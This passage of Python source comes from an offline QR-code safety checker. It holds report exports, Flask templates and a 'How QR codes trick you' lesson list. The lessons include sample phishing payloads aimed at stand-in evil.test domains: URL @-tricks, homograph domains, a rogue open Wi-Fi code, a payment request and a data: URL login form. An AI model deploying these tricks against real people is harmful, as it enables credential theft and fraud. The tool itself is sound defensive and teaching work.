           if bad else "every character is plain ASCII")
    out.append(f'<text x="20" y="115" class="anfoot">{html_escape(msg)}</text>')
    return (f'<figure class="chart wide"><figcaption>{html_escape(title)} &middot; green is '
            f'ASCII, red is not what it appears to be</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="100%" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(out)}</svg></figure>')


def svg_pie(items, size=180, title="Findings by severity", fmt=lambda v: f"{v:g}"):
    items = [(l, float(v), c) for (l, v, c) in items if v and v > 0]
    total = sum(v for _, v, _ in items)
    if total <= 0:
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    cx = cy = size / 2
    r_out, r_in = size / 2 - 10, size / 2 - 42
    parts, legend, angle = [], [], -90.0
    for label, value, color in items:
        sweep = 360.0 * value / total
        if abs(sweep - 360.0) < 1e-9:
            parts.append(f'<circle cx="{cx}" cy="{cy}" r="{(r_out + r_in) / 2:.2f}" '
                         f'fill="none" stroke="{color}" stroke-width="{r_out - r_in:.2f}"/>')
        else:
            a0, a1 = math.radians(angle), math.radians(angle + sweep)
            x0, y0 = cx + r_out * math.cos(a0), cy + r_out * math.sin(a0)
            x1, y1 = cx + r_out * math.cos(a1), cy + r_out * math.sin(a1)
            x2, y2 = cx + r_in * math.cos(a1), cy + r_in * math.sin(a1)
            x3, y3 = cx + r_in * math.cos(a0), cy + r_in * math.sin(a0)
            lg = 1 if sweep > 180 else 0
            parts.append(f'<path d="M {x0:.2f} {y0:.2f} A {r_out:.2f} {r_out:.2f} 0 {lg} 1 '
                         f'{x1:.2f} {y1:.2f} L {x2:.2f} {y2:.2f} A {r_in:.2f} {r_in:.2f} 0 '
                         f'{lg} 0 {x3:.2f} {y3:.2f} Z" fill="{color}">'
                         f'<title>{html_escape(label)}: {html_escape(fmt(value))}</title>'
                         f'</path>')
        angle += sweep
        legend.append(f'<div class="lg"><i style="background:{color}"></i>'
                      f'<span>{html_escape(label)}</span><b>{html_escape(fmt(value))}</b>'
                      f'</div>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<div class="chart-row"><svg viewBox="0 0 {size} {size}" width="{size}" '
            f'height="{size}" role="img" aria-label="{html_escape(title)}">{"".join(parts)}'
            f'<text x="{cx}" y="{cy + 5}" text-anchor="middle" class="pie-n">'
            f'{html_escape(fmt(total))}</text></svg>'
            f'<div class="legend">{"".join(legend)}</div></div></figure>')


def svg_bar(items, width=430, title="", color="#22b8cf", fmt=lambda v: f"{v:g}"):
    items = [(str(l), float(v or 0)) for l, v in items]
    if not items or all(v <= 0 for _, v in items):
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    row_h, gap, pad_l, pad_t = 22, 7, 150, 8
    height = pad_t * 2 + len(items) * (row_h + gap)
    mx = max(v for _, v in items) or 1
    bw = width - pad_l - 60
    rows = []
    for i, (label, value) in enumerate(items):
        y = pad_t + i * (row_h + gap)
        w = max(2.0, bw * value / mx)
        lbl = label if len(label) <= 20 else label[:19] + "\u2026"
        rows.append(
            f'<text x="{pad_l - 9}" y="{y + row_h * 0.7:.1f}" text-anchor="end" class="bl">'
            f'{html_escape(lbl)}</text>'
            f'<rect x="{pad_l}" y="{y}" width="{bw}" height="{row_h}" rx="4" class="btrack"/>'
            f'<rect x="{pad_l}" y="{y}" width="{w:.1f}" height="{row_h}" rx="4" '
            f'fill="{color}"><title>{html_escape(label)}: {html_escape(fmt(value))}</title>'
            f'</rect>'
            f'<text x="{pad_l + bw + 7:.1f}" y="{y + row_h * 0.7:.1f}" class="bv">'
            f'{html_escape(fmt(value))}</text>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="{width}" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(rows)}</svg></figure>')


# =============================================================================
# SECTION 10 - Exports
# =============================================================================

def report_payload(sid=None, conn=None) -> dict:
    own = conn is None
    conn = conn or connect()
    try:
        sid = sid or latest_scan_id(conn)
        scan = scan_summary(sid, conn) if sid else None
        return {
            "tool": APP_NAME, "version": VERSION, "author": AUTHOR,
            "generated_at": now_iso(),
            "NEVER_FETCHES": NEVER_FETCHES,
            "disclaimer": DISCLAIMER_LONG,
            "limits": [
                "This is NOT a malware scanner and there is no list of known-bad sites.",
                "A clean result means 'no obvious structural trick', never 'safe'. A domain "
                "registered minutes ago to host a phishing page looks perfectly clean here.",
                "Nothing was fetched, so no redirect was followed and no page content was "
                "seen. A shortener's destination is unknown to this tool by design.",
                "The look-alike comparison uses a short built-in list of commonly "
                "impersonated brands. A brand not on that list will not be compared.",
                "The public-suffix list used to find the registrable domain is a curated "
                "subset, not the complete Public Suffix List.",
            ],
            "scan": scan,
            "payloads": scan_payloads(sid, conn) if sid else [],
        }
    finally:
        if own:
            conn.close()


def export_json(sid=None) -> str:
    return json.dumps(report_payload(sid), indent=2, default=str)


def export_csv(sid=None) -> str:
    conn = connect()
    try:
        sid = sid or latest_scan_id(conn)
        buf = io.StringIO()
        w = csv.writer(buf, lineterminator="\n")
        w.writerow([f"# {APP_NAME} v{VERSION} by {AUTHOR}"])
        w.writerow([f"# scan={sid} generated={now_iso()}"])
        w.writerow(["# NOTHING WAS FETCHED. Offline structural analysis only."])
        w.writerow([f"# {DISCLAIMER_SHORT}"])
        w.writerow([])
        w.writerow(["payload_n", "kind", "score", "band", "destination", "payload"])
        for p in scan_payloads(sid, conn):
            w.writerow([p["ordinal"] + 1, p["kind"], p["score"], p["band"],
                        p["destination"] or "", p["payload"]])
        w.writerow([])
        w.writerow(["payload_n", "severity", "category", "title", "description", "advice"])
        for p in scan_payloads(sid, conn):
            for f in p["findings"]:
                w.writerow([p["ordinal"] + 1, f["severity"], f["category"], f["title"],
                            f["description"], f["advice"]])
        return buf.getvalue()
    finally:
        conn.close()


def _payload_visuals(p: dict) -> str:
    res = p.get("result") or {}
    out = ""
    d = res.get("dissected")
    if d:
        out += f'<div class="charts">{svg_url_anatomy(d)}</div>'
        host = d.get("host") or ""
        display = punycode_decode(host)[0] or host
        if display and (not display.isascii() or "xn--" in host.lower()):
            out += f'<div class="charts">{svg_charcompare(display)}</div>'
    return out


def export_html(sid=None) -> str:
    conn = connect()
    try:
        rep = report_payload(sid, conn)
        scan, esc = rep["scan"], html_escape
        if not scan:
            return "<!doctype html><html><body><h1>No scans</h1></body></html>"
        counts = {s: scan[s] or 0 for s in SEVERITIES}
        pie = svg_pie([(s, counts[s], SEV_COLOR[s]) for s in SEVERITIES])
        gauge = svg_gauge(scan["worst_score"] or 0, scan["worst_band"] or "")
        limits = "".join(f"<li>{esc(x)}</li>" for x in rep["limits"])
        blocks = ""
        for p in rep["payloads"]:
            res = p.get("result") or {}
            colour = risk_band(p["score"] or 0)[1]
            frows = "".join(
                f'<div class="find"><span class="pill" '
                f'style="background:{SEV_COLOR.get(f["severity"], "#888")}">'
                f'{esc(f["severity"].upper())}</span> <b>{esc(f["title"])}</b>'
                f'<div class="desc">{esc(f["description"])}</div>'
                + (f'<pre>{esc(f["evidence"])}</pre>' if f["evidence"] else "")
                + (f'<div class="advice"><b>What to do:</b> {esc(f["advice"])}</div>'
                   if f["advice"] else "") + "</div>" for f in p["findings"])
            blocks += (
                f'<h2>Code {p["ordinal"] + 1} of {len(rep["payloads"])} &middot; '
                f'{esc(res.get("kind_label", p["kind"]))}</h2>'
                f'<div class="verdict" style="border-color:{colour}">'
                f'<div class="v" style="color:{colour}">{p["score"]:g}</div>'
                f'<div class="why"><b>{esc(p["band"])}</b>'
                f'<div class="mono">{esc(res.get("visible", p["payload"])[:300])}</div>'
                + (f'<div class="dest">Destination: <b>{esc(p["destination"])}</b></div>'
                   if p["destination"] else "")
                + f'<div class="sub2">{esc(res.get("kind_note", ""))}</div></div></div>'
                + _payload_visuals(p) + (frows or
                                         '<div class="chart-empty">No findings.</div>'))
        return f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{APP_SHORT} report</title><style>
 body{{font:14px/1.55 ui-sans-serif,system-ui,'Segoe UI',Roboto,sans-serif;margin:0;
      background:#0f1115;color:#e6e8ee}}
 .wrap{{max-width:1120px;margin:0 auto;padding:28px 20px 60px}}
 h1{{font-size:22px;margin:0 0 4px}} .meta{{color:#8b8f9b;font-size:12.5px}}
 h2{{font-size:12px;text-transform:uppercase;letter-spacing:.15em;color:#8b8f9b;
     margin:32px 0 12px;border-bottom:1px solid #262a33;padding-bottom:8px}}
 .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin:16px 0}}
 .card{{background:#171a21;border:1px solid #262a33;border-radius:10px;padding:12px 14px}}
 .card .n{{font-size:21px;font-weight:700;font-family:ui-monospace,monospace}}
 .card .l{{font-size:10.5px;text-transform:uppercase;letter-spacing:.11em;color:#8b8f9b}}
 .verdict{{display:flex;gap:18px;align-items:center;flex-wrap:wrap;background:#171a21;
   border:2px solid #262a33;border-radius:12px;padding:16px 20px;margin-bottom:14px}}
 .verdict .v{{font-family:ui-monospace,monospace;font-weight:700;font-size:30px}}
 .verdict .why{{flex:1;min-width:280px}}
 .mono{{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;word-break:break-all;
   color:#b6bac4;margin-top:5px}}
 .dest{{margin-top:6px;color:#ffcf9e;font-size:13px}}
 .sub2{{color:#8b8f9b;font-size:11.5px;margin-top:5px}}
 .find{{background:#171a21;border:1px solid #262a33;border-radius:9px;padding:11px 13px;
   margin-bottom:9px}}
 .pill{{color:#0f1115;font-weight:700;font-size:10px;padding:2px 8px;border-radius:20px}}
 .desc{{color:#b6bac4;margin-top:5px;max-width:82ch}}
 .advice{{margin-top:6px;color:#8fd3b0;font-size:12.6px;max-width:82ch}}
 pre{{background:#0f1115;border:1px solid #262a33;border-radius:6px;padding:8px;
      font-family:ui-monospace,monospace;font-size:11.5px;margin:6px 0 0;overflow:auto;
      white-space:pre-wrap;word-break:break-all;color:#b6bac4}}
 .never{{background:#12261c;border:1px solid #1e5138;color:#a6e8c4;padding:13px 15px;
   border-radius:10px;font-size:13px;margin:16px 0;font-weight:600}}
 .warn{{background:#231a12;border:1px solid #5a3b1c;color:#ffcf9e;padding:12px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0;white-space:pre-wrap}}
 .note{{background:#12202a;border:1px solid #1c4a5e;color:#a8d8e8;padding:11px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0}}
 .note ul{{margin:6px 0 0 18px;padding:0}} .note li{{margin:3px 0}}
 .charts{{display:flex;gap:18px;flex-wrap:wrap;align-items:flex-start;margin-bottom:12px}}
 .chart{{margin:0;background:#171a21;border:1px solid #262a33;border-radius:10px;
   padding:14px 16px}}
 .chart.wide{{width:100%}}
 .chart figcaption{{font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;
   color:#8b8f9b;margin-bottom:10px;font-family:ui-monospace,monospace}}
 .chart-row{{display:flex;gap:16px;align-items:center;flex-wrap:wrap}}
 .chart-empty{{background:#171a21;border:1px dashed #31363f;border-radius:10px;padding:16px;
   color:#8b8f9b;font-size:12.5px}}
 .legend{{display:flex;flex-direction:column;gap:6px;min-width:140px}}
 .lg{{display:flex;align-items:center;gap:7px;font-size:12.5px}}
 .lg i{{width:11px;height:11px;border-radius:3px}} .lg span{{flex:1}}
 text.bl{{fill:#8b8f9b;font:10.5px ui-monospace,monospace}}
 text.bv{{fill:#e6e8ee;font:11px ui-monospace,monospace}}
 rect.btrack{{fill:#1e222a}}
 text.anlabel{{font:700 11px ui-sans-serif;letter-spacing:.06em}}
 text.anval{{fill:#e6e8ee;font:13px ui-monospace,monospace}}
 text.annote{{fill:#8b8f9b;font:10.5px ui-sans-serif}}
 text.anfoot{{fill:#ffcf9e;font:12px ui-sans-serif}}
 text.cc{{fill:#e6e8ee;font:700 17px ui-monospace,monospace}}
 text.ccbad{{fill:#e5484d;font:9.5px ui-monospace,monospace}}
 text.cccode{{fill:#8b8f9b;font:9px ui-monospace,monospace}}
 text.pie-n{{fill:#e6e8ee;font:700 16px ui-monospace,monospace}}
 text.g-n{{font:700 27px ui-monospace,monospace}}
 text.g-l{{fill:#8b8f9b;font:10px ui-monospace,monospace}}
 footer{{margin-top:36px;color:#6f7685;font-size:12px;border-top:1px solid #262a33;
   padding-top:14px}}
</style></head><body><div class="wrap">
<h1>{APP_NAME} - QR code safety report</h1>
<div class="meta">{ts_pretty(scan['ts'])} &middot; {scan['payload_count']} code(s) &middot;
 source: {esc(scan['source'] or scan['origin'])}</div>
<div class="never">{esc(NEVER_FETCHES)}</div>
<div class="charts" style="margin-top:14px">{gauge}
 <div style="flex:1;min-width:240px"><div style="font-size:23px;font-weight:700">
 {esc(scan['worst_band'] or '')}</div>
 <div class="meta">worst of {scan['payload_count']} code(s) &middot;
 {scan['findings']} finding(s)</div></div>{pie}</div>
<div class="note"><b>What this report cannot tell you:</b><ul>{limits}</ul></div>
<div class="warn">{esc(DISCLAIMER_LONG)}</div>
{blocks}
<footer>Generated by {APP_NAME} v{VERSION} &middot; {AUTHOR} &middot; {GITHUB}<br>
 Nothing in this report was fetched. Every judgement is made on the payload as text, and a
 clean result means no obvious trick was found - not that a destination is safe.</footer>
</div></body></html>"""
    finally:
        conn.close()


# =============================================================================
# SECTION 11 - Web application (no CDN, no JS libraries, no uploads leave the box)
# =============================================================================

CSS = """
:root{--bg:#0f1115;--panel:#171a21;--panel-2:#1c2029;--line:#262a33;--line-2:#31363f;
 --tx:#e6e8ee;--tx-dim:#8b8f9b;--tx-mid:#b6bac4;--accent:#30a46c;--ok:#30a46c;
 --warn:#ffb224;--crit:#e5484d;--good:#8fd3b0;
 --mono:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,'Courier New',monospace;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--tx);
 font:14px/1.55 ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
header.top{border-bottom:1px solid var(--line);background:var(--panel);position:sticky;top:0;z-index:9}
.hd{max-width:1180px;margin:0 auto;padding:11px 20px;display:flex;align-items:center;gap:14px;
 flex-wrap:wrap}
.brand{font-family:var(--mono);font-weight:700;letter-spacing:-.4px;font-size:15px}
.brand b{color:var(--accent)}
.brand small{display:block;font-weight:400;font-size:10px;letter-spacing:.14em;
 text-transform:uppercase;color:var(--tx-dim)}
nav{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
nav a{font-family:var(--mono);font-size:11.5px;letter-spacing:.05em;text-transform:uppercase;
 padding:6px 10px;border-radius:6px;color:var(--tx-dim)}
nav a:hover{background:var(--panel-2);color:var(--tx);text-decoration:none}
nav a.on{background:var(--accent);color:#0b0d10;font-weight:600}
.wrap{max-width:1180px;margin:0 auto;padding:20px 20px 70px}
.never{background:#12261c;border:1px solid #1e5138;color:#a6e8c4;padding:11px 15px;
 border-radius:9px;font-size:12.6px;margin-bottom:12px;font-weight:600;line-height:1.5}
.banner{background:#231a12;border:1px solid #5a3b1c;color:#ffcf9e;padding:10px 14px;
 border-radius:9px;font-size:12.3px;margin-bottom:12px;line-height:1.5}
.banner.info{background:#12202a;border-color:#1c4a5e;color:#a8d8e8}
.banner.bad{background:#2a1216;border-color:#6b2229;color:#ffc9cd}
.banner b{color:#fff} .banner ul{margin:6px 0 0 18px;padding:0} .banner li{margin:3px 0}
h1{font-size:19px;margin:0 0 3px;letter-spacing:-.3px}
h2{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
 color:var(--tx-dim);margin:24px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--line)}
.sub{color:var(--tx-dim);font-size:12.5px;margin-bottom:14px}
.sub2{color:var(--tx-dim);font-size:11.5px;margin-top:5px}
.bar{display:flex;gap:9px;align-items:center;flex-wrap:wrap;margin:0 0 16px}
.btn{font-family:var(--mono);font-size:12px;padding:8px 13px;border-radius:7px;cursor:pointer;
 border:1px solid var(--line-2);background:var(--panel-2);color:var(--tx);display:inline-block}
.btn:hover{border-color:var(--accent);text-decoration:none}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#0b0d10;font-weight:700}
input[type=text],input[type=file],textarea,select{font-family:var(--mono);font-size:12px;
 padding:8px 10px;background:var(--panel-2);color:var(--tx);border:1px solid var(--line-2);
 border-radius:7px}
input[type=text]{min-width:420px;flex:1} textarea{width:100%;min-height:90px}
.grid{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));margin:14px 0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:13px 15px}
.card .l{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;
 color:var(--tx-dim)}
.card .n{font-size:21px;font-weight:700;line-height:1.3;font-family:var(--mono)}
.verdict{display:flex;gap:18px;align-items:center;flex-wrap:wrap;background:var(--panel);
 border:2px solid var(--line);border-radius:12px;padding:16px 20px;margin-bottom:14px}
.verdict .v{font-family:var(--mono);font-weight:700;font-size:30px}
.verdict .why{flex:1;min-width:280px}
.dest{margin-top:6px;color:#ffcf9e;font-size:13px}
.mono{font-family:var(--mono);font-size:11.5px;word-break:break-all;color:var(--tx-mid);
 margin-top:5px}
.find{background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:11px 13px;
 margin-bottom:9px}
.pill{display:inline-block;color:#0b0d10;font-weight:700;font-size:10px;padding:2px 8px;
 border-radius:20px;letter-spacing:.06em;font-family:var(--mono)}
.desc{color:var(--tx-mid);margin-top:5px;max-width:82ch}
.advice{margin-top:6px;color:var(--good);font-size:12.6px;max-width:82ch}
pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:8px 10px;
 font-family:var(--mono);font-size:11.5px;margin:6px 0 0;max-height:220px;overflow:auto;
 white-space:pre-wrap;word-break:break-all;color:var(--tx-mid)}
table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);
 border-radius:11px;overflow:hidden;font-size:12.7px}
th{text-align:left;font-family:var(--mono);font-size:10.5px;letter-spacing:.11em;
 text-transform:uppercase;color:var(--tx-dim);padding:9px 11px;border-bottom:1px solid var(--line);
 background:var(--panel-2)}
td{padding:8px 11px;border-bottom:1px solid #1e222a;vertical-align:top}
tr:last-child td{border-bottom:none} tr:hover td{background:#1b1f27}
.num{font-family:var(--mono);text-align:right}
.charts{display:flex;gap:18px;flex-wrap:wrap;align-items:flex-start;margin-bottom:12px}
.chart{margin:0;background:var(--panel);border:1px solid var(--line);border-radius:11px;
 padding:14px 16px}
.chart.wide{width:100%}
.chart figcaption{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;
 text-transform:uppercase;color:var(--tx-dim);margin-bottom:10px}
.chart-row{display:flex;gap:16px;align-items:center;flex-wrap:wrap}
.chart-empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;
 padding:16px;color:var(--tx-dim);font-size:12.5px;flex:1;min-width:250px}
.legend{display:flex;flex-direction:column;gap:6px;min-width:140px}
.lg{display:flex;align-items:center;gap:7px;font-size:12.5px}
.lg i{width:11px;height:11px;border-radius:3px;flex:none} .lg span{flex:1}
.lg b{font-family:var(--mono)}
text.bl{fill:#8b8f9b;font:10.5px var(--mono)} text.bv{fill:#e6e8ee;font:11px var(--mono)}
rect.btrack{fill:#1e222a}
text.anlabel{font:700 11px ui-sans-serif;letter-spacing:.06em}
text.anval{fill:#e6e8ee;font:13px var(--mono)}
text.annote{fill:#8b8f9b;font:10.5px ui-sans-serif}
text.anfoot{fill:#ffcf9e;font:12px ui-sans-serif}
text.cc{fill:#e6e8ee;font:700 17px var(--mono)}
text.ccbad{fill:#e5484d;font:9.5px var(--mono)}
text.cccode{fill:#8b8f9b;font:9px var(--mono)}
text.pie-n{fill:#e6e8ee;font:700 16px var(--mono)}
text.g-n{font:700 27px var(--mono)} text.g-l{fill:#8b8f9b;font:10px var(--mono)}
.empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;padding:28px;
 text-align:center;color:var(--tx-dim)}
.empty b{display:block;color:var(--tx);margin-bottom:6px;font-size:15px}
footer{max-width:1180px;margin:0 auto;padding:16px 20px 40px;color:#6f7685;font-size:11.5px;
 border-top:1px solid var(--line);line-height:1.7}
@media (max-width:640px){.hd{padding:10px 14px} .wrap{padding:14px 14px 50px}
 nav{margin-left:0;width:100%} input[type=text]{min-width:100%} .card .n{font-size:18px}}
"""

BASE_TPL = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ page }} - """ + APP_SHORT + """</title><style>""" + CSS + """</style></head><body>
<header class="top"><div class="hd">
 <div class="brand"><b>QRSAFE</b> <small>offline &middot; never fetches anything</small></div>
 <nav>
  <a href="{{ url_for('page_home') }}" class="{{ 'on' if nav=='home' }}">Check</a>
  <a href="{{ url_for('page_examples') }}" class="{{ 'on' if nav=='examples' }}">Examples</a>
  <a href="{{ url_for('page_learn') }}" class="{{ 'on' if nav=='learn' }}">How they trick you</a>
  <a href="{{ url_for('page_scans') }}" class="{{ 'on' if nav=='scans' }}">History</a>
 </nav></div></header>
<div class="wrap">
 <div class="never">""" + NEVER_FETCHES + """</div>
 {% if error %}<div class="banner bad"><b>That failed:</b> {{ error }}</div>{% endif %}
 {% block body %}{% endblock %}
</div>
<footer>""" + APP_NAME + """ v""" + VERSION + """ &middot; built by """ + AUTHOR + """ &middot;
 <a href=\"""" + GITHUB + """\" rel="noopener">GitHub</a> &middot;
 <a href=\"""" + LINKEDIN + """\" rel="noopener">LinkedIn</a><br>
 <b>Not a malware scanner.</b> There is no list of known-bad sites and there cannot be one
 offline. A clean result means no obvious structural trick was found - never that a
 destination is safe.</footer>
</body></html>"""

HOME_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Check a QR code</h1>
<div class="sub">Upload a photo of the code, or paste what it decoded to. Nothing you submit
 leaves this machine, and nothing in it is ever opened.</div>
<form method="post" action="{{ url_for('do_check') }}" enctype="multipart/form-data">
 <div class="bar">
  <input type="file" name="image" accept="image/*">
  <button class="btn primary" type="submit">Check the image</button>
  <span class="sub2">{{ decoder_note }}</span>
 </div>
</form>
<form method="post" action="{{ url_for('do_check') }}">
 <div class="bar">
  <input type="text" name="payload" placeholder="or paste the decoded text, e.g. https://..."
   value="{{ last_payload or '' }}">
  <button class="btn primary" type="submit">Check the text</button>
 </div>
</form>
{% if batch %}
{% for r in batch.results %}
<h2>Code {{ loop.index }} of {{ batch.count }} &middot; {{ r.kind_label }}</h2>
<div class="verdict" style="border-color:{{ r.colour }}">
 <div class="v" style="color:{{ r.colour }}">{{ r.score|round|int }}</div>
 <div class="why"><b>{{ r.band }}</b>
  <div class="mono">{{ r.visible }}</div>
  {% if r.destination %}<div class="dest">Destination: <b>{{ r.destination }}</b>
   &middot; this is the only part that decides where you go</div>{% endif %}
  <div class="sub2">{{ r.kind_note }}</div></div>
</div>
{% if r.anatomy %}<div class="charts">{{ r.anatomy|safe }}</div>{% endif %}
{% if r.charcompare %}<div class="charts">{{ r.charcompare|safe }}</div>{% endif %}
{% for f in r.findings %}
<div class="find"><span class="pill" style="background:{{ sev[f.severity] }}">
 {{ f.severity|upper }}</span> <b>{{ f.title }}</b>
 <div class="desc">{{ f.description }}</div>
 {% if f.evidence %}<pre>{{ f.evidence }}</pre>{% endif %}
 {% if f.advice %}<div class="advice"><b>What to do:</b> {{ f.advice }}</div>{% endif %}
</div>
{% endfor %}
{% if not r.findings %}<div class="chart-empty">Nothing stood out. That is not the same as
 safe - see the note in the footer.</div>{% endif %}
{% endfor %}
{% if scan_id %}
<div class="bar" style="margin-top:16px">
 <a class="btn" href="{{ url_for('export', fmt='html') }}?scan={{ scan_id }}">Export HTML</a>
 <a class="btn" href="{{ url_for('export', fmt='json') }}?scan={{ scan_id }}">JSON</a>
 <a class="btn" href="{{ url_for('export', fmt='csv') }}?scan={{ scan_id }}">CSV</a>
</div>
{% endif %}
{% elif decoder_error %}
<div class="banner"><b>The image could not be read:</b> {{ decoder_error }}</div>
{% else %}
<div class="empty"><b>Nothing checked yet</b>
 A QR code is opaque by design - you cannot look at one and know where it goes. That gap is
 the whole attack. Paste a payload above, or try the <a href="{{ url_for('page_examples') }}">
 examples</a>.</div>
{% endif %}
{% endblock %}"""

EXAMPLES_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Examples</h1>
<div class="sub">Each of these is a real technique. Click one to run it through the checks -
 nothing is opened, and the payloads point at reserved example domains.</div>
<table><tr><th>Technique</th><th>Payload</th><th></th></tr>
{% for desc, payload in examples %}
<tr><td>{{ desc }}</td><td class="mono">{{ payload[:70] }}{{ '...' if payload|length > 70 }}</td>
 <td><form method="post" action="{{ url_for('do_check') }}">
  <input type="hidden" name="payload" value="{{ payload }}">
  <button class="btn" type="submit">Check it</button></form></td></tr>
{% endfor %}</table>
<div class="banner info" style="margin-top:16px"><b>These are safe to click here</b> because
 this tool never opens anything - it only reads the text. Do not paste them into a browser.</div>
{% endblock %}"""

LEARN_TPL = """{% extends 'base.html' %}{% block body %}
<h1>How QR codes trick you</h1>
<div class="sub">A QR code is unreadable to a human. Every technique below exploits that one
 fact.</div>
{% for title, body, example in lessons %}
<h2>{{ title }}</h2>
<div class="desc" style="max-width:86ch">{{ body }}</div>
{% if example %}<pre>{{ example }}</pre>{% endif %}
{% endfor %}
<h2>The physical attack</h2>
<div class="desc" style="max-width:86ch">The most common real-world QR attack involves no
 technical skill at all: a printed sticker placed over the legitimate code on a parking meter,
 a restaurant table, a charity poster or a payment terminal. Nothing about the code itself is
 unusual - it just is not the one the owner put there. Before scanning a code in public, look
 at whether it is a sticker on top of something, and whether its edges are lifting. If it is,
 tell whoever owns the surface.</div>
{% endblock %}"""

SCANS_TPL = """{% extends 'base.html' %}{% block body %}
<h1>History</h1>
<div class="sub">Every check is stored locally so you can come back to it.</div>
{% if scans %}
<table><tr><th>#</th><th>When</th><th>Source</th><th>Codes</th><th>Worst</th><th>Verdict</th>
 <th></th></tr>
{% for s in scans %}<tr>
 <td class="num">{{ s.id }}</td><td class="mono">{{ s.ts[:19].replace('T',' ') }}</td>
 <td class="mono">{{ (s.source or s.origin)[:34] }}</td>
 <td class="num">{{ s.payload_count }}</td>
 <td class="num">{{ s.worst_score|round|int }}</td><td>{{ s.worst_band }}</td>
 <td><a class="btn" href="{{ url_for('export', fmt='html') }}?scan={{ s.id }}">HTML</a></td>
</tr>{% endfor %}</table>
{% else %}<div class="empty"><b>Nothing checked yet</b></div>{% endif %}
{% endblock %}"""

TEMPLATES = {"base.html": BASE_TPL, "home.html": HOME_TPL, "examples.html": EXAMPLES_TPL,
             "learn.html": LEARN_TPL, "scans.html": SCANS_TPL}

LESSONS = [
    ("The @ trick",
     "Everything before an @ in a URL is a username, not a destination. The browser goes to "
     "whatever comes after it. Your eye stops reading at the familiar name at the front, "
     "which is exactly what it is there for.",
     "https://apple.com@evil.test/login   ->   actually goes to evil.test"),
    ("Homograph domains",
     "Many alphabets contain letters that are visually identical to Latin ones. A domain "
     "using a Cyrillic 'a' is a completely different domain from one using a Latin 'a', but "
     "on screen they are the same shape. This is why the tool prints the character names "
     "rather than the characters.",
     "xn--pple-43d.com   displays as   apple.com  (with a Cyrillic first letter)"),
    ("Read a hostname from the right",
     "Only the last two parts of a hostname decide where you go. Anyone can create "
     "google.com.anything.example, and on a phone the address bar is too narrow to show you "
     "the end of it.",
     "https://google.com.evil.test/signin   ->   you are going to evil.test"),
    ("Addresses that do not look like addresses",
     "A browser accepts an address written as a single decimal number, or in hexadecimal. "
     "Most people would not recognise those as addresses at all.",
     "http://2130706433/   is   http://127.0.0.1/"),
    ("Shorteners hide everything",
     "A shortened link tells you nothing, and neither this tool nor you can see through it "
     "without asking the shortener - which tells the operator someone is looking. Many "
     "shorteners will show you the destination if you add a + to the end of the link.",
     "https://bit.ly/xxxxx+   often previews the real destination"),
    ("Wi-Fi codes join networks",
     "A QR code can carry a wireless network name and password. One tap and the device is on "
     "someone else's network, where everything not independently encrypted is visible to "
     "them. An open network with a plausible name is the whole attack.",
     "WIFI:S:Free_Airport_WiFi;T:nopass;P:;;"),
    ("Payment codes move money",
     "A payment code fills in a recipient, and often an amount. Check both on your own "
     "screen, in your own app - the name shown in the code was chosen by whoever made it.",
     "upi://pay?pa=someone@bank&pn=Looks%20Official&am=4999.00"),
    ("The page can be inside the code",
     "A data: URL carries its whole content in the link itself. There is no domain, no "
     "certificate and no server - so there is nothing to check, nothing to report, and a "
     "complete login form can be delivered by a sticker.",
     "data:text/html;base64,PGZvcm0+PGlucHV0IHR5cGU9InBhc3N3b3JkIj4="),
]

try:
    from flask import (Flask, Response, jsonify, redirect, render_template, request,
                       url_for)
    from jinja2 import ChoiceLoader, DictLoader
    HAVE_FLASK = True
except Exception:  # pragma: no cover
    HAVE_FLASK = False


def _decorate(results: list[dict]) -> list[dict]:
    """Attach the diagrams each result needs."""
    for r in results:
        d = r.get("dissected")
        r["anatomy"] = svg_url_anatomy(d) if d else ""
        r["charcompare"] = ""
        if d and d.get("host"):
            host = d["host"]
            display = punycode_decode(host)[0] or host
            if display and (not display.isascii() or "xn--" in host.lower()):
                r["charcompare"] = svg_charcompare(display)
    return results


def build_app():
    if not HAVE_FLASK:
        raise SystemExit("Flask is not installed. Install it with:  pip install flask\n"
                         "(The CLI works without Flask; only the web app needs it.)")
    app = Flask(__name__)
    app.config["MAX_CONTENT_LENGTH"] = 12 * 1024 * 1024
    app.jinja_loader = ChoiceLoader([DictLoader(TEMPLATES), app.jinja_loader])

